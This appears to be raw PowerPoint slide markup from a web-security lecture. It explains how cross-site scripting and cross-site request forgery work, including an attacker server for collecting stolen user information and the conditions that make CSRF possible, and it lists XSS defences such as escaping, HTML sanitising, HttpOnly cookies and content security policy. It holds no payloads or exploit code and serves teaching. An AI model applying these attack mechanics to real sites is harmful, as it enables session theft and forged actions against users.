        <p:nvSpPr>
          <p:cNvPr id="10" name="object 10"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2902324" y="4700868"/>
            <a:ext cx="6691313" cy="325923"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr lIns="0" tIns="0" rIns="0" bIns="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="11185">
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr sz="2118" spc="9" dirty="0">
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>Optional: </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2118" dirty="0">
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>A </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2118" spc="-4" dirty="0">
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>server </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2118" dirty="0">
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>for </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2118" spc="22" dirty="0">
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>receiving </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2118" spc="-4" dirty="0">
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>stolen user</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2118" spc="26" dirty="0">
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2118" dirty="0">
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>information</a:t>
            </a:r>
            <a:endParaRPr sz="2118">
              <a:latin typeface="Arial"/>
              <a:cs typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="object 11"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2332225" y="5395632"/>
            <a:ext cx="124665" cy="244362"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr lIns="0" tIns="0" rIns="0" bIns="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="11185">
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1588" spc="251" dirty="0">
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>•</a:t>
            </a:r>
            <a:endParaRPr sz="1588">
              <a:latin typeface="Arial"/>
              <a:cs typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="177164" name="object 12"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="2599765" y="5374622"/>
            <a:ext cx="6441982" cy="641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12700">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl1pPr>
            <a:lvl2pPr marL="742950" indent="-285750">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl2pPr>
            <a:lvl3pPr marL="1143000" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl3pPr>
            <a:lvl4pPr marL="1600200" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl4pPr>
            <a:lvl5pPr marL="2057400" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl5pPr>
            <a:lvl6pPr marL="2514600" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl6pPr>
            <a:lvl7pPr marL="2971800" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl7pPr>
            <a:lvl8pPr marL="3429000" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl8pPr>
            <a:lvl9pPr marL="3886200" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl9pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPts val="2471"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2118">
                <a:solidFill>
                  <a:srgbClr val="C82506"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Key trick</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2118">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>: Server does not ensure its output does not  contain foreign, embedded scripts</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="33614185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Preventing XSS</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Train and maintain awareness </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Don’t  trust any user input </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Use escaping/encoding </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Sanitize HTML </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Set the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>HttpOnly</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> flag for cookies </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Use Content security policy </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Scan Regularly using Web Vulnerability scanners </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{56E90A38-B1BF-454F-A0C4-5401CDA122E6}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>27</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="146247376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CSRF</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Text Placeholder 5"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6478210" y="1063415"/>
            <a:ext cx="5326741" cy="5197079"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Google Sans"/>
              </a:rPr>
              <a:t>Cross-site request forgery (also known as CSRF) </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" cap="none" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Google Sans"/>
              </a:rPr>
              <a:t>Is A Web Security Vulnerability That Allows An Attacker To Induce Users To Perform Actions That They Do Not Intend To Perform.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="5C5C5B"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>It Allows An Attacker To Partly Circumvent The Same Origin Policy, Which Is Designed To Prevent Different Websites From Interfering With Each Other</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="5C5C5B"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:solidFill>
                <a:schemeClr val="tx1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{56E90A38-B1BF-454F-A0C4-5401CDA122E6}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>28</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="180507156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ACCBF6-165D-DB94-7ED2-99433097BE33}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="935184" y="717177"/>
            <a:ext cx="10321636" cy="1357936"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="5C5C5B"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" i="0" dirty="0">
                <a:effectLst/>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>How does CSRF work?</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" b="1" i="0" dirty="0">
                <a:effectLst/>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
            </a:br>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{4764CF33-C443-3AC7-08F0-B0F785584CF6}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="500855" y="1541700"/>
            <a:ext cx="11260555" cy="6524928"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0">
                <a:effectLst/>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>For a CSRF attack to be possible, three key conditions must be in place:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>A relevant action.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t> There is an action within the application that the attacker has a reason to induce. This might be a privileged action (such as modifying permissions for other users) or any action on user-specific data (such as changing the user's own password).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Cookie-based session handling.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t> Performing the action involves issuing one or more HTTP requests, and the application relies solely on session cookies to identify the user who has made the requests. There is no other mechanism in place for tracking sessions or validating user requests.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>No unpredictable request parameters.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t> The requests that perform the action do not contain any parameters whose values the attacker cannot determine or guess. For example, when causing a user to change their password, the function is not vulnerable if an attacker needs to know the value of the existing password.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="302943017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39228" y="717176"/>
            <a:ext cx="7513544" cy="828368"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr rtlCol="0"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="316027" eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr sz="5383" spc="-57" dirty="0"/>
              <a:t>URLs </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="5383" spc="13" dirty="0"/>
              <a:t>with </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="5383" spc="88" dirty="0"/>
              <a:t>side</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="5383" spc="22" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="5383" spc="40" dirty="0"/>
              <a:t>effects</a:t>
            </a:r>
            <a:endParaRPr sz="5383"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="object 3"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2077291" y="2512919"/>
            <a:ext cx="140074" cy="271613"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr lIns="0" tIns="0" rIns="0" bIns="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="11185">
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1765" spc="287" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>•</a:t>
            </a:r>
            <a:endParaRPr sz="1765">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
              <a:cs typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="object 4"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2375647" y="2459691"/>
            <a:ext cx="7577978" cy="366575"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr lIns="0" tIns="0" rIns="0" bIns="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="11185">
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr sz="2382" spc="-71" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>GET </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2382" spc="22" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>requests </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2382" spc="13" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>often have </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2382" b="1" spc="13" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>side effects on server</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2382" b="1" spc="18" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2382" b="1" spc="13" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>state</a:t>
            </a:r>
            <a:endParaRPr sz="2382">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
              <a:cs typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="object 5"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2381251" y="3015784"/>
            <a:ext cx="138673" cy="271613"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr lIns="0" tIns="0" rIns="0" bIns="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="11185">
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1765" spc="287" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>•</a:t>
            </a:r>
            <a:endParaRPr sz="1765" dirty="0">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
              <a:cs typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="object 6"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2689412" y="2963956"/>
            <a:ext cx="5341004" cy="366575"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr lIns="0" tIns="0" rIns="0" bIns="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="11185">
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr sz="2382" spc="-18" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>Even </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2382" spc="35" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>though </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2382" spc="13" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>they </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2382" spc="-4" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>are </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2382" spc="13" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>not </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2382" spc="66" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>supposed</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2382" spc="-35" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2382" spc="9" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>to</a:t>
            </a:r>
            <a:endParaRPr sz="2382" dirty="0">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
              <a:cs typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="object 7"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2077291" y="3751169"/>
            <a:ext cx="140074" cy="271613"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr lIns="0" tIns="0" rIns="0" bIns="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="11185">
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1765" spc="287" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>•</a:t>
            </a:r>
